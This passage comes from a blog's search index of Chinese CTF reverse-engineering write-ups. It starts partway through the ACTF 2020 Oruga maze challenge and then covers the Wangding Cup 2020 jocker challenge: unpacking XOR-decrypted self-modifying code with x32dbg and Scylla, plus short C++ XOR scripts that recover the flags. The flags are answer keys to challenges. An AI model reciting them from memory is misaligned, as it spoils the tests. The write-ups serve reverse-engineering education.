[rbp-8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">5</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( byte_201020[v2] != <span class="hljs-number">0x21</span> )<br>  &#123;<br>    v2 -= v4;<span class="hljs-comment">//重复动作的时候会多做一次走到障碍物上，所以每次循环都要回退一步</span><br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;W&#x27;</span> || v4 == <span class="hljs-number">-16</span> )<span class="hljs-comment">// 上</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;E&#x27;</span> || v4 == <span class="hljs-number">1</span> )<span class="hljs-comment">// 右</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;M&#x27;</span> || v4 == <span class="hljs-number">16</span> )<span class="hljs-comment">// 下</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;J&#x27;</span> || v4 == <span class="hljs-number">-1</span> )<span class="hljs-comment">// 左</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>          v4 = <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v4 = <span class="hljs-number">16</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v4 = <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v4 = <span class="hljs-number">-16</span>;<br>    &#125;<br>    ++v3;<br>      <span class="hljs-comment">/*上方代码读取动作，下方代码重复读取的动作直到碰到障碍物，但是不能越界*/</span><br>    <span class="hljs-keyword">while</span> ( !byte_201020[v2] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">-1</span> &amp;&amp; (v2 &amp; <span class="hljs-number">0xF</span>) == <span class="hljs-number">0</span> )<span class="hljs-comment">//16的倍数，左边界越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">1</span> &amp;&amp; v2 % <span class="hljs-number">16</span> == <span class="hljs-number">15</span> )<span class="hljs-comment">//右边界越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">16</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 - <span class="hljs-number">240</span>) &lt;= <span class="hljs-number">0xF</span> )<span class="hljs-comment">//动作是向下并且到了最后一行，越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">-16</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 + <span class="hljs-number">15</span>) &lt;= <span class="hljs-number">0x1E</span> )<span class="hljs-comment">//动作是向上并且到了第一行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      v2 += v4;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> *(_BYTE *)(v3 + input_addr) == <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看byte_201020</p><p><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/2.png" alt="2"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">maze=[<span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x30&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x54&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x49&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x21&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>, <span class="hljs-string">&#x27;0x45&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">elif</span> maze[<span class="hljs-number">16</span>*i + j] == <span class="hljs-string">&#x27;0x0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;O&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">elif</span> maze[<span class="hljs-number">16</span>*i + j] == <span class="hljs-string">&#x27;0x21&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;E&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X&quot;</span>,end=<span class="hljs-string">&quot; &quot;</span>)<br>         <br>        <br></code></pre></td></tr></table></figure><p>运行得到迷宫<br><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/3.png" alt="3"></p><p>走迷宫即可得到flag{MEWEMEWJMEWJM}</p>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>maze</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>青龙组-jocker</title>
    <link href="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/"/>
    <url>/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h1><p>本题的难点在于：第12行if语句中对加密函数encrypt的代码本体使用VirtualProtect函数进行了加密保护，再在第24，25行对encrypt函数代码与0x41异或进行解密还原，所以只有执行完for循环后才能得到真正的encrypt函数，因此需要动态调试在for循环结束后并且调用encrypt前的位置下断点，再f8步入真正的encrypt函数中，将真正的加密函数dump下来，感觉就是脱壳，但是这里的壳加在了关键函数上。</p><p>查看文件，无壳，32位，ida查看</p><p>main函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p><p>读入输入的flag后复制到Destination中，再进行加密，加密函数encrypt无法查看。</p><p>这里的wrong函数和omg函数暂时不用看，真正的加密过程在encrypt中。</p><p>同时出现了堆栈不平衡的问题，堆栈平衡即正常函数在被调用完后会将栈指针（esp）和桢指针（ebp）还原到被调用前的状态，从而不影响调用它的函数的正常执行。（不仅如此，寄存器也会还原。一般会将调用前的寄存器压入栈，调用完再pop回去）</p><p>这里出现堆栈不平衡是因为在静态编译时encrypt函数还没有被解码还原，不是一个功能正常的函数，导致调用完encrypt后栈指针（esp）没有被还原，影响了调用它的函数正常执行，程序产生错误。只要动态调试，就会进行encrypt函数的还原后再调用encrypt函数，不会出现堆栈不平衡的问题，所以其实不用理会这个问题也能把题目做出来。（网上很多writeup说不解决这个问题无法f5看伪c代码，不知道为什么我可以直接f5不受影响，总之下面是解决方法。）</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p><p> 在菜单中的option的general中勾选stack pointer查看函数调用过程中栈指针的变化进行验证</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p><p>可以看到call完encrypt函数后栈指针就乱了，没有被还原到0AC，所以这里手动帮encrypt函数还原栈指针,选中encrypt和finally函数的call指令，alt+k，将偏移修改为0</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/6.png" alt="6"></p><p>修改完后f5反汇编，伪c界面的堆栈不平衡警告就没了</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"> <img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/7.png" alt="7"></p><p>下面设断点动态调试dump出encrypt函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/8.png" alt="8"></p><p>在ida中结合汇编和伪c判断40182B是for循环结束的位置，下面的call jocker.401500就是encrypt函数</p><p>f9到断点后f7步入函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/9.png" alt="9"></p><p>dump的oep是401500，用x32dbg的scylla插件dump后修复</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/10.png" alt="10"></p><p>输入oep后点击IAT Autosearch和Get Imports，再dump出jocker_dump.exe,再点击fix dump，选择jocker_dump.exe,修复文件得到修复完成的jocker_dump_SCY.exe,ida查看</p><p>下面是还原的encrypt函数</p><p>修复后的main函数，观察可知需要经过start函数和sub_40159A函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/11.png" alt="11"></p><p>start函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/12.png" alt="12"></p><p>sub_40159A函数</p><p><img src="/2022/07/08/%E9%9D%92%E9%BE%99%E7%BB%84-jocker/13.png" alt="13"></p><p>start函数可以逆向出flag的前19位，sub_40159A函数得到后5位</p><p>写脚本逆向</p><p>start</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">char</span>  str[<span class="hljs-number">19</span>]=&#123;<span class="hljs-number">0xe</span>,<span class="hljs-number">0xd</span>,<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0xd</span>&#125;;<br><span class="hljs-type">char</span>  key[]=&#123;<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>&#125;;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">19</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">18</span>;i++)&#123;<br>flag[i]=str[i]^key[i];<br>cout&lt;&lt;flag[i];<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>得到flag前19位：flag{d07abccf8a410c</p><p>sub_40159A</p><p>看代码看不出是怎么加密的，但是flag最后一位肯定是}，加密后变为：，猜测加密方式和之前相同是逐位异或，}与71异或得到：，所以异或的数字是71</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">char</span>  str[<span class="hljs-number">5</span>]=&#123;<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>&#125;;<br> <span class="hljs-type">char</span> a;<br> <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">4</span>;i++)&#123;<br> a=str[i]^<span class="hljs-number">71</span>;<br> cout&lt;&lt;a;<br> &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>flag后五位：b37a}</p><p>flag{d07abccf8a410cb37a}猜测正确</p>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>smc</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
